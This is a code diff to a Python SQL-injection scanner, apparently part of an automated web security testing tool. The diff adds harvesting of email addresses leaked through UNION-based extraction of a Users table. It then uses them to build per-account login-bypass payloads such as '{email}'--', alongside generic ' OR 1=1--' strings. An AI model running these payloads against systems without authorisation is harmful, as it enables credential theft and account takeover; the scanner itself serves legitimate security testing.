@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import re
 import time
 import uuid
 from typing import Any
@@ -86,6 +87,18 @@ SEARCH_SQLI_PAYLOADS = [
     "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
 ]
 
+# Harvest email addresses that leak in responses (e.g. via UNION extraction,
+# user directories, reviews, or error output). Any account name so discovered
+# becomes a precise auth-bypass target — see _test_login_injection. Framework-
+# agnostic: no account name is hardcoded; the target set is whatever a given
+# app happens to leak during the scan.
+EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
+
+# Cap how many discovered accounts we target so a large leak can't explode the
+# number of login attempts (and blow the scan time budget). A small cap still
+# covers the handful of accounts whose emails typically leak.
+MAX_TARGETED_ACCOUNTS = 8
+
 # --- NoSQL (document-DB) injection ---------------------------------------
 #
 # Unlike SQL payloads, NoSQL operators only take effect when they reach the
@@ -142,8 +155,18 @@ class SQLiScanner(BaseScanner):
     async def scan(self, config: ScanConfig) -> list[Finding]:
         findings: list[Finding] = []
 
+        # Accounts whose email leaks in a response become precise login-bypass
+        # targets. Reset per scan invocation.
+        self._discovered_emails: set[str] = set()
+
         # Pull work from queue — each item is a param to test
         work_items = self.claim_work(limit=50)
+
+        # Process login endpoints last so any accounts leaked while testing the
+        # other endpoints (e.g. via UNION extraction) are available as targets.
+        work_items.sort(
+            key=lambda it: it.get("payload", {}).get("type") == "login_endpoint"
+        )
 
         for item in work_items:
             params = item.get("payload", {}).get("params", {})
@@ -230,6 +253,7 @@ class SQLiScanner(BaseScanner):
                     baseline_url = f"{baseline_url}?{urlencode(endpoint.parameters)}"
                 baseline_resp = await self.http.get(baseline_url)
                 baseline_len = len(baseline_resp.text)
+                self._harvest_emails(baseline_resp.text)
         except Exception:
             pass
 
@@ -247,6 +271,10 @@ class SQLiScanner(BaseScanner):
                     response = await self.http.post(endpoint.url, data=test_params)
             except Exception:
                 continue
+
+            # A UNION/extraction payload often dumps a user table into the
+            # response — mine it for accounts to target at the login endpoint.
+            self._harvest_emails(response.text)
 
             # Error-based detection
             response_lower = response.text.lower()
@@ -475,6 +503,33 @@ class SQLiScanner(BaseScanner):
                 )
         return None
 
+    def _harvest_emails(self, text: str) -> None:
+        """Collect email addresses leaked in a response for targeted bypass.
+
+        Any account name that surfaces (via UNION extraction, a user directory,
+        reviews, error output, etc.) is recorded so the login-bypass test can
+        target that specific account rather than only the first user row.
+        Scanner-synthesised addresses are skipped so we never target ourselves.
+        No account name is hardcoded — the set is whatever the target app leaks.
+        """
+        if not text:
+            return
+        emails = getattr(self, "_discovered_emails", None)
+        if emails is None:
+            emails = self._discovered_emails = set()
+        if len(emails) >= MAX_TARGETED_ACCOUNTS:
+            return
+        for match in EMAIL_RE.findall(text):
+            email = match.strip().lower()
+            # Skip addresses this scanner injects itself (test probe accounts).
+            if "diana-test-" in email or "diana-role-" in email:
+                continue
+            if email.endswith("@test.local"):
+                continue
+            emails.add(email)
+            if len(emails) >= MAX_TARGETED_ACCOUNTS:
+                break
+
     async def _test_login_injection_endpoint(self, endpoint: Endpoint) -> list[Finding]:
         """Test a single login endpoint for SQL injection auth bypass."""
         return await self._test_login_injection([endpoint])
@@ -486,13 +541,25 @@ class SQLiScanner(BaseScanner):
         if not login_endpoints:
             return findings
 
-        login_payloads = [
+        # Generic auth-bypass primitives — these log in as the first matching
+        # row (typically the first / admin account).
+        generic_payloads = [
             "' OR 1=1--",
             "' OR '1'='1'--",
             "admin'--",
             "' OR 1=1#",
             "\" OR 1=1--",
         ]
+
+        # Precise, per-account primitives built from any accounts discovered
+        # while testing the other endpoints. `{email}'--` comments out the
+        # password check for that specific row, logging in as that exact user
+        # instead of merely the first one. No account name is hardcoded — the
+        # set is whatever leaked during the scan.
+        targeted_accounts = sorted(getattr(self, "_discovered_emails", set()))[
+            :MAX_TARGETED_ACCOUNTS
+        ]
+        targeted_payloads = [(email, f"{email}'--") for email in targeted_accounts]
 
         # Common login field patterns — tried in order
         # None marks the injection target field
@@ -502,6 +569,27 @@ class SQLiScanner(BaseScanner):
             {"user": None, "pass": "x"},
             {"login": None, "password": "x"},
         ]
+
+        auth_indicators = ["token", "jwt", "session", "authenticated", "success"]
+
+        async def _attempt(endpoint: Endpoint, fields: dict, user_field: str,
+                           payload: str):
+            """Send one login attempt. Returns (authed, errored, response)."""
+            test_data = dict(fields)
+            test_data[user_field] = payload
+            try:
+                response = await self.http.post(endpoint.url, json=test_data)
+            except Exception:
+                return None, False, None
+            authed = response.status_code == 200 and any(
+                ind in response.text.lower() for ind in auth_indicators
+            )
+            errored = any(p in response.text.lower() for p in SQL_ERROR_PATTERNS)
+            return authed, errored, response
+
+        # Cap how many per-account findings we emit so a large leak can't
+        # produce an unbounded number of near-identical findings.
+        MAX_TARGETED_FINDINGS = 10
 
         for endpoint in login_endpoints:
             # Build field sets: start with any real params from crawler,
@@ -523,27 +611,24 @@ class SQLiScanner(BaseScanner):
             # Always include common patterns as fallback
             field_sets.extend(common_field_sets)
 
+            generic_reported = False
+            reported_accounts: set[str] = set()
+
             for fields in field_sets:
                 user_field = next(k for k, v in fields.items() if v is None)
+                injectable = False
 
-                for sqli_payload in login_payloads:
-                    test_data = dict(fields)
-                    test_data[user_field] = sqli_payload
-
-                    try:
-                        response = await self.http.post(
-                            endpoint.url,
-                            json=test_data,
-                        )
-                    except Exception:
+                # Phase 1 — confirm the injection point with generic primitives.
+                for sqli_payload in generic_payloads:
+                    authed, errored, response = await _attempt(
+                        endpoint, fields, user_field, sqli_payload,
+                    )
+                    if response is None:
                         continue
-
-                    # Check if we got authenticated (200 + token = SQLi auth bypass)
-                    if response.status_code == 200:
-                        body = response.text.lower()
-                        if any(indicator in body for indicator in [
-                            "token", "jwt", "session", "authenticated", "success",
-                        ]):
+                    if authed:
+                        injectable = True
+                        if not generic_reported:
+                            generic_reported = True
                             findings.append(Finding(
                                 id=f"SQLI-AUTH-{uuid.uuid4().hex[:8]}",
                                 vuln_type=VulnType.SQLI,
@@ -563,12 +648,11 @@ class SQLiScanner(BaseScanner):
                                     "Never concatenate user input into SQL WHERE clauses."
                                 ),
                             ))
-                            return findings  # One finding is enough
-
-                    # Also check for error-based SQLi on login
-                    response_lower = response.text.lower()
-                    for pattern in SQL_ERROR_PATTERNS:
-                        if pattern in response_lower:
+                        break
+                    if errored:
+                        injectable = True
+                        if not generic_reported:
+                            generic_reported = True
                             findings.append(Finding(
                                 id=f"SQLI-LOGIN-{uuid.uuid4().hex[:8]}",
                                 vuln_type=VulnType.SQLI,
@@ -586,6 +670,43 @@ class SQLiScanner(BaseScanner):
                                     "Use parameterized queries for authentication."
                                 ),
                             ))
-                            return findings
+                        break
+
+                # Phase 2 — once the point is confirmed, log in as each specific
+                # discovered account via `{email}'--`.
+                if injectable:
+                    for email, sqli_payload in targeted_payloads:
+                        authed, _errored, response = await _attempt(
+                            endpoint, fields, user_field, sqli_payload,
+                        )
+                        if authed and email not in reported_accounts:
+                            reported_accounts.add(email)
+                            if len(reported_accounts) <= MAX_TARGETED_FINDINGS:
+                                findings.append(Finding(
+                                    id=f"SQLI-AUTH-{uuid.uuid4().hex[:8]}",
+                                    vuln_type=VulnType.SQLI,
+                                    severity=Severity.CRITICAL,
+                                    title=(
+                                        f"SQL Injection Auth Bypass as {email} "
+                                        f"at {endpoint.url}"
+                                    ),
+                                    description=(
+                                        f"The login endpoint's '{user_field}' field is "
+                                        f"injectable, allowing an attacker to authenticate "
+                                        f"as the specific account '{email}' by commenting "
+                                        f"out the password check."
+                                    ),
+                                    endpoint=endpoint,
+                                    evidence=response.text[:500],
+                                    payload_used=sqli_payload,
+                                    cwe_id="CWE-89",
+                                    remediation=(
+                                        "Use parameterized queries for authentication. "
+                                        "Never concatenate user input into SQL WHERE clauses."
+                                    ),
+                                ))
+                    # Injection point confirmed for this endpoint; other field
+                    # sets would be redundant noise.
+                    break
 
         return findings
